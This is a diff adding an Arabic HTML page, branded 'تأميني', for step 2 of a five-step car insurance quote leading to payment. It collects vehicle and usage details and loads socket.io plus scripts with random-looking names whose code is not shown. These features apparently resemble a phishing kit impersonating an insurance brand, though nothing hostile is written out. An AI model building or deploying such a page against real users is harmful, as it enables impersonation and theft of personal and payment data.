@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>تأميني</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/styleb.css">
+
+</head>
+<body>
+<div class="app">
+<header>
+<div class="logo">
+<div class="logo-icon" style="display:flex;align-items:center;justify-content:center;padding:0;overflow:hidden;"><img alt="تأميني" src="images/logo.png" style="width:100%;height:100%;object-fit:cover;display:block;"/></div>
+<span>تأميني</span>
+</div>
+</header>
+<div class="stepper">
+<div class="step" data-step="1">
+<div class="step-number">1</div>
+<span>البيانات الأساسية</span>
+</div>
+<div class="step active" data-step="2">
+<div class="step-number">2</div>
+<span>بيانات التأمين</span>
+</div>
+<div class="step" data-step="3">
+<div class="step-number">3</div>
+<span>قائمة الأسعار</span>
+</div>
+<div class="step" data-step="4">
+<div class="step-number">4</div>
+<span>الإضافات</span>
+</div>
+<div class="step" data-step="5">
+<div class="step-number">5</div>
+<span>الملخص والدفع</span>
+</div>
+</div>
+<main>
+<form id="formStep2">
+<h2>بيانات التأمين</h2>
+<div class="field">
+<label class="label" for="carMake">نوع المركبة</label>
+<input id="carMake" name="carMake" placeholder="مثال: تويوتا كامري" type="text"/>
+<div class="error" id="carMakeError"></div>
+</div>
+<div class="field">
+<label class="label" for="carYear">سنة الصنع</label>
+<input id="carYear" name="carYear" placeholder="مثال: 2020" type="number"/>
+<div class="error" id="carYearError"></div>
+</div>
+<div class="field">
+<label class="label" for="usageType">نوع الاستخدام</label>
+<select id="usageType" name="usageType">
+<option value="">اختر نوع الاستخدام</option>
+<option value="private">خصوصي</option>
+<option value="commercial">تجاري</option>
+<option value="ride">تطبيقات نقل الركاب</option>
+</select>
+<div class="error" id="usageTypeError"></div>
+</div>
+<div class="field">
+<label class="label" for="city">مدينة الاستخدام</label>
+<input id="city" name="city" placeholder="مثال: الرياض" type="text"/>
+<div class="error" id="cityError"></div>
+</div>
+<div class="field">
+<label class="label" for="startDate">تاريخ بداية التأمين</label>
+<input id="startDate" name="startDate" type="date"/>
+<div class="error" id="startDateError"></div>
+</div>
+<div class="buttons-row">
+<a class='btn btn-secondary' href='index.html'>السابق</a>
+<button class="btn btn-primary" type="submit">التالي</button>
+</div>
+</form>
+</main>
+</div>
+<script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+<script src="js/vehicle.js"></script>
+<script src="js/p9o3.js"></script>
+<script src="js/kn5k.js"></script>
+<div class="loading-screen" id="loadingScreen">
+<div class="loading-content">
+<div class="loading-dots">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+<div class="loading-text" id="loadingText">جاري التحميل...</div>
+<div class="loading-subtext" id="loadingSubtext">يرجى الانتظار</div>
+</div>
+</div>
+
+</body>
+</html>
